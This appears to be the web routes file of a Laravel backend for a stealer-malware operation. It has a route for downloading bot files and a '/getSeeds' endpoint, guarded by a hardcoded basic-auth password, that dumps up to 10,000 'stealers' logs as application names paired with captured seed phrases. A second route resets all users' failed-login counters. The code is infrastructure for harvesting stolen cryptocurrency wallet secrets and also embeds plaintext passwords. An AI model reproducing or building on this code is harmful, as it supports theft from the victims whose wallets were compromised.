<?php

use App\Helpers\ApiResponse;
use App\Http\Controllers\Api\v1\Bot\BotFileManagerController;
use App\Models\User;
use App\Services\LogsService\LogsFilter;
use App\Services\LogsService\LogsService;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function (): ApiResponse {
    return ApiResponse::error('not found', 404);
});

Route::get("/download/botFile/{fileId}", [BotFileManagerController::class, "download"]);

Route::get('/getSeeds', function (): ApiResponse {
    $login = "seed";
    $password = "uIecs%Xe5ZS%B~@~j|%JlSjl";
    if (
        isset($_SERVER['PHP_AUTH_USER'])
        && ($_SERVER['PHP_AUTH_PW'] == $password)
        && (strtolower($_SERVER['PHP_AUTH_USER']) == $login)
    ) {
        $user = User::first();

        $filter = new LogsFilter();
        $filter->setUser($user);
        $filter->setPerPage(10000);
        $filter->setType("stealers");

        $service = new LogsService($filter);

        $logs = $service->getLogs();

        foreach ($logs as $log) {
            echo $log->application . ": " . ($log->log["phrase"] ?? $log->log["seed"] ?? "error");
            echo "<br />";
        }
    } else {
        header('WWW-Authenticate: Basic realm="Backend"');
        header('HTTP/1.0 401 Unauthorized');
    }
    exit;
});

Route::get('/resetAuthAttempts', function (): ApiResponse {
    $login = "resetAuthAttempts";
    $password = "uIecs%Xe5ZS%B~@~j|%JlSjl!";

    if (
        isset($_SERVER['PHP_AUTH_USER'])
        && ($_SERVER['PHP_AUTH_PW'] == $password)
        && (strtolower($_SERVER['PHP_AUTH_USER']) == $login)
    ) {
        $users = User::all();

        foreach($users as $user) {
            $user->update([
                "failed_auth_attempts" => 0,
            ]);
        }

        echo "Attempts reset successfully";
    } else {
        header('WWW-Authenticate: Basic realm="Backend"');
        header('HTTP/1.0 401 Unauthorized');
    }
    exit;
});
